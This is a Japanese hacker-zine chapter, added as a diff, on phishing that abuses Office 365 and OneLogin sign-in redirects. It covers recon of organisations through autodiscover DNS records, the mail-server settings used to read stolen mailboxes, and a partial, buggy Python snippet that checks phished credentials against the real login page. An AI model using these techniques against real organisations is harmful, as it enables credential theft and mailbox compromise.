@@ -1,0 +1,248 @@
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第○章: Microsoft Office 365の仕様を逆手に取ったフィッシングについて ---
+
+著者：黒林檎
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) 最初に
+
+　お久しぶりです、黒林檎です。
+　2017年4月に発売される『ハッカーの学校　ハッキング実験室』を書かせて頂きました。
+
+サポートサイト(目次など含む) : http://ruffnex.net/kuroringo/TwitterHack/
+Amazon : https://www.amazon.co.jp/dp/4781702279/
+
+　ハッキング実験室では、Twitterを対象にし、『アカウントの自動作成・フィッシングサイトの作成・キーロガー・ボットネットの作成』などを書いています。
+　Twitter本というとTwitter APIを用いた本が多いですが、特徴としてTwitter APIを一切使用しないハッキング初心者のプログラミング入門本をイメージしました。
+　ハッキング以外にも、そういう非APIプログラミングなどを学びたい方は是非一度書店などで手をとっていただけると幸いです。
+
+　今回は本書にちなんで、今回はMicrosoft Office 365(以下:Office365)の仕様を逆手に取ったフィッシングについて考えていきます。
+
+
+■0x02.) Office365とOneLogin
+
+　ウィキペディアには、Office365は以下のように説明されています。
+
+=ここから=
+　Microsoft Office 365はマイクロソフトから提供される商用のソフトウェア プラス サービス型クラウド サービスで、デスクトップ アプリケーションであるMicrosoft Officeスイートの月額課金バージョンと、マイクロソフト サーバー製品であるExchange Server、SharePoint Server、Skype for Business Serverをマイクロソフトがホスティングして提供されるクラウド サービスをセットにした製品。[1][2] Office 365 は BPOSの次期バージョンという位置づけであり、[3]ベータ バージョンの提供を経て、2011年6月28日（29日）に正式版が提供された。
+
+Link:https://ja.wikipedia.org/wiki/Microsoft_Office_365
+=ここまで=
+
+　おそらく、Office365とOneLoginの両者は、多くの企業・団体で活用されていると思われます。
+　一例として、クラウド型シングルサインオン・アクセスコントロール(IDaaS)である、OneLoginと連携して社内などで管理している場合も多いでしょう。
+　そこで、Office365のウェブログインページに注目してみましょう。
+
+
+■0x03.) Office365のログインページについて
+
+　Office365のログインページは、以下になります。
+
+https://login.microsoftonline.com/login.srf?wa=wsignin1.0&rpsnv=4&ct=1490360011&rver=6.7.6640.0&wp=MCMBI&wreply=https%3a%2f%2fportal.office.com%2flanding.aspx%3ftarget%3d%252fdefault.aspx&lc=1041&id=501392&msafed=0&client-request-id=63935b31-ecfc-4540-a81d-c4597b82c6a3
+
+　一見普通のログインサイトですが、Office365を使用している企業・団体などのドメイン名を入力します。
+　入力値は、以下のような文字列で問題ありません。
+
+ユーザー名 : test@[Office365を使用しているドメイン]
+パスワード : 適当な文字列
+
+　正しいOffice365を使用しているドメインであった場合、「お客様の組織のサインイン ページに移動しています。」という文面が表示され、対象の企業・団体のログイン画面にリダイレクトされます。
+　おそらく、リダイレクトされた画面は企業・団体の人間が普段使用しているログイン画面だと思います。
+　多くの場合に、このログイン画面は先ほど説明した通りに、OneLoginなどの簡易なシステムで普段ログインしていると思われます。
+　その場合、Office365の仕様を逆手に取ったハッキングはもう少し問題として大きくなります。
+　次で説明しますが、Office365をOneLoginで簡易的に活用している場合、特定のサブドメイン名が機能する場合があります。
+有効になっている場合、digコマンドなどで以下の結果が得られます。
+
+=パターンA ここから=
+;; ANSWER SECTION:
+autodiscover.[組織・団体名].co.jp.	3599	IN	CNAME	autodiscover.outlook.com.
+autodiscover.outlook.com. 288	IN	CNAME	autodiscover.geo.outlook.com.
+autodiscover.geo.outlook.com. 288 IN	CNAME	autodiscover.outlook.com.g.outlook.com.
+autodiscover.outlook.com.g.outlook.com.	288 IN CNAME autodiscover-apacsouth.outlook.com.
+autodiscover-apacsouth.outlook.com. 288	IN A	[IPアドレス]
+autodiscover-apacsouth.outlook.com. 288	IN A	[IPアドレス]
+autodiscover-apacsouth.outlook.com. 288	IN A	[IPアドレス]
+autodiscover-apacsouth.outlook.com. 288	IN A	[IPアドレス]
+autodiscover-apacsouth.outlook.com. 288	IN A	[IPアドレス]
+autodiscover-apacsouth.outlook.com. 288	IN A	[IPアドレス]
+autodiscover-apacsouth.outlook.com. 288	IN A	[IPアドレス]
+autodiscover-apacsouth.outlook.com. 288	IN A	[IPアドレス]
+autodiscover-apacsouth.outlook.com. 288	IN A	[IPアドレス]
+autodiscover-apacsouth.outlook.com. 288	IN A	[IPアドレス]
+=パターンA ここまで=
+
+=パターンB ここから=
+;; ANSWER SECTION:
+autodiscover.[組織・団体名].co.jp.	3599	IN	CNAME	autodiscover.outlook.com.
+autodiscover.outlook.com. 30	IN	CNAME	autodiscover.geo.outlook.com.
+autodiscover.geo.outlook.com. 30 IN	CNAME	autodiscover.outlook.com.g.outlook.com.
+autodiscover.outlook.com.g.outlook.com.	30 IN CNAME autodiscover-apacsouth.outlook.com.
+autodiscover-apacsouth.outlook.com. 30 IN A	[IPアドレス]
+autodiscover-apacsouth.outlook.com. 30 IN A	[IPアドレス]
+autodiscover-apacsouth.outlook.com. 30 IN A	[IPアドレス]
+autodiscover-apacsouth.outlook.com. 30 IN A	[IPアドレス]
+autodiscover-apacsouth.outlook.com. 30 IN A	[IPアドレス]
+autodiscover-apacsouth.outlook.com. 30 IN A	[IPアドレス]
+autodiscover-apacsouth.outlook.com. 30 IN A	[IPアドレス]
+autodiscover-apacsouth.outlook.com. 30 IN A	[IPアドレス]
+autodiscover-apacsouth.outlook.com. 30 IN A	[IPアドレス]
+autodiscover-apacsouth.outlook.com. 30 IN A	[IPアドレス]
+=パターンB ここまで=
+
+=パターンC ここから=
+;; AUTHORITY SECTION:
+[組織・団体名].jp. 299	IN	SOA	ns1-05.azure-dns.com. azuredns-hostmaster.microsoft.com. 2017031501 28800 7200 604800 300
+=パターンC ここまで=
+
+　autodiscover.[組織・団体名].co.jpとautodiscover.outlook.com.となぜ紐付けているか疑問を抱く方もいると思います。
+　Office365で自社ドメインを使用する場合、Office 365のDNSホスティングプロバイダでDNSレコードを作成する必要があります。
+　調べた限りで、設定パターン2通りでパターンA・Bは同じ方法です。
+　こちらは後述しますが、パターンA・Bの場合は設定したサブドメインを使うことで簡単に自社社員ログイン画面までリダイレクトされる可能性があります。
+　パターンCに関しては、Azure DNSを使用して設定しており、autodiscover.[組織・団体名].jpというサブドメインで紐付けていません。
+　よって、この設定パターンの場合は今回の話の対象になりません。
+　攻撃者は、この設定を上手く扱いフィッシングに活用する可能性があります。
+
+Office 365のDNSホスティングプロバイダでDNSレコードを作成する
+参考リンク : https://support.office.com/en-us/article/Create-DNS-records-at-any-DNS-hosting-provider-for-Office-365-7b7b075d-79f9-4e37-8a9e-fb60c1d95166?ui=en-US&rs=en-US&ad=US#bkmk_add_cname
+Azure CLI 2.0でAzure DNSの使用を開始する
+参考リンク : https://docs.microsoft.com/ja-jp/azure/dns/dns-getstarted-cli
+
+※今回、企業・団体にご迷惑をおかけしないため実際に筆者が調べたドメイン名などは発表しません。
+
+
+■0x04.) フィッシング視点で対象システムを見る
+
+　先ほどのステップで、自社のシステムが該当した場合に攻撃者視点で考えてみましょう。
+　Office365やOneLoginで使用されているドメイン名は、企業・団体などの自身のドメインではありません。
+　まず、Office365と何かしらのドメインをDNS設定で紐付けているパターンが多いと思われます。
+そのため、普段のフィッシングサイトなどで見極める基準である情報で判断するには難しくなります。
+
+・ドメイン名
+・EV証明書
+
+　多くの場合に、Office365とOneLoginのURLを所属している組織の多くの人間が把握していないという問題があります。
+　理由として、業務進行の最適化などの理由でログイン認証などをOneLoginで終わらせているため社員や組織の人間がログインページの存在について詳しく知らないというパターンがあります。
+　例えば、OneLoginでOffice365を統括している場合に、以下のようなURLでログイン画面にリダイレクトされる場合があります。
+
+[*]http://autodiscover.[Office365を使用しているドメイン]
+
+　上記のドメインでリダイレクトされる先は、調べた限りで下記のようなドメインになりました。
+
+・https://ap.ssso.hdems.com/
+・https://hoge.onelogin.com/login
+
+　しかし、OneLoginはログインできる機器を制限できるはずなので、フィッシングで抜き取った情報で社員システム内部にアクセスするには難しいと思われます。
+　ただ、Office365(POP/SMTP)に関しては、メール受信端末の制限が甘い可能性が高いため、フィッシングでユーザー名とパスワードを取得できれば、公開されてるメールサーバーの情報から自分の端末でメールの受信設定を行えばメールを盗み取る事が可能と考えられます。
+
+=メールの設定値 ここから=
+受信メール (IMAP) サーバー:outlook.office365.com
+ポート:993	
+SSL (TLS) が必要:あり
+
+受信メール (POP) サーバー:outlook.office365.com
+ポート:995
+SSL (TLS) が必要:あり
+
+送信メール (SMTP) サーバー:smtp.office365.com
+ポート:587
+SSL (TLS) が必要:はい
+=メールの設定値 ここまで=
+
+
+■0x05.) フィッシングサイトの構築
+
+　ここからは、Office365に直接的な関係性はありません。
+　書籍内で用いてる手法をOffice365に応用した場合について書いてみます。
+　構築するフィッシングサイトは、HTTPステータスコードなどの作りが標準的な作りのため正規のアカンウトのみのフィッシングが可能です。
+　まず、2サイトのログイン時のステータスコードを見てみましょう。
+
+=ここから=
+OneLoginを使用しているAサイト ログイン失敗時StatusCode: 200
+
+OneLoginを使用しているBサイト ログイン失敗時StatusCode: 403
+=ここまで=
+
+正しい、アカウント情報を入力した際に302でリダイレクトされると想定できるので以下のようになると思われます。
+
+=ここから=
+OneLoginを使用しているAサイト ログイン成功時StatusCode: 302
+OneLoginを使用しているAサイト ログイン失敗時StatusCode: 200
+
+OneLoginを使用しているBサイト ログイン成功時StatusCode: 200 or 302
+OneLoginを使用しているBサイト ログイン失敗時StatusCode: 403
+=ここまで=
+
+　フィッシングサイトで被害者の入力値(ユーザー名 / パスワード)を取得すれば、フィッシングサイトの裏側で対象のシステムに不正にログインリクエストを送信し、HTTPステータスコードを比較すれば正しいアカウントを確認することができます。
+　Pythonのrequestsモジュールでログインリクエストを送信する場合以下のようなコードになります。
+　また、このソースコードをFlackアプリに埋め込むことでFlackで生成したフィッシングサイトで簡単に有効なアカウントかのチェックが可能です。
+
+=擬似フィッシングサイトリクエスト送信箇所 ここから=
+import requests
+
+
+session = requests.Session()
+
+# ツイートPOST送信のリクエスト
+headers = {
+    "User-Agent": "Mozilla/5.0",
+    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+    "accept-language":"ja,en-US;q=0.8,en;q=0.6",
+    "content-type":"application/x-www-form-urlencoded"
+}
+
+payload = {
+	"ogin_user":"ユーザー名",
+	"login_pwd":"パスワード",
+	"show_remember":"0",
+	"state_string":"XXXXXXXXX",
+	"continue":"
+} 
+
+
+# 組織・団体のウェブサイトのユーザーIDをリクエストパラメータに設定
+payload[ogin_user] = self.username
+# 組織・団体のウェブサイトのユーザーPasswordをリクエストパラメータに設定
+payload[ogin_user] = self.password
+
+try:
+    login = session.post('https://twitter.com/sessions', headers=headers, data=payload, allow_redirects=True)
+    if login.status_code == 302:
+        print "[+] ログイン完了 HTTPステータスコード: ",
+        print login.status_code
+    else:
+        print "[+] ログイン失敗 HTTPステータスコード: ",
+        print login.status_code
+except:
+    "[+] ログイン中に通信エラー"
+※ソースコードは実際に実行できるコードから省略しています。
+=擬似ソースコード ここまで=
+
+　フィッシングサイトの生成に関しては詳細な説明は、ここで省きます。
+　OneLoginでも送信するパラメータは違う可能性があります。
+　一部のOneLoginを用いた組織・団体では、以下のような送信パラメータでした。
+
+=ここから=
+authenticity_token:+TOKhzGVIUOKUDBJKBJjkbkjFcAbqGuMwszWp8=
+email:ユーザー名
+password:パスワード
+commit:ログイン
+_:
+=ここまで=
+
+　仮にHTTPステータスコードが302のアカウントを釣ることに成功すれば、今回のプログラムであれば「[+] ログイン完了 HTTPステータスコード: 200」という文がコンソールに出てプログラムが終了します。
+　しかし、RequestsモジュールはHTTPライブラリでセッションを保持するため、システムを知り尽くしている攻撃者であればログインが成功した次の処理でパスワードの強制変更などを書くことできます。
+　その様なパスワード強制変更などはログイン機器などの制限をすることで、防ぐことはできますが「フィッシング視点で対象システムを見る」で話とおり、メール受信端末の制限は甘い可能性が高くパスワードを盗みとった攻撃者であればメールの不正受信を確かめる可能性は高いと思われます。
+
+
+■0x05.) おわりに
+
+　今回のお話はここまでになります。
+　かなり狭いレベルですが、中小企業などを狙うフィッシング攻撃の増加など近年問題視されています。
+　小規模でも情報量が多く時間を掛けてクラッキングするメリットがある組織・団体であれば、入り組んだフィッシング攻撃のターゲットにあう可能性もあるのではないでしょうか?
+
+
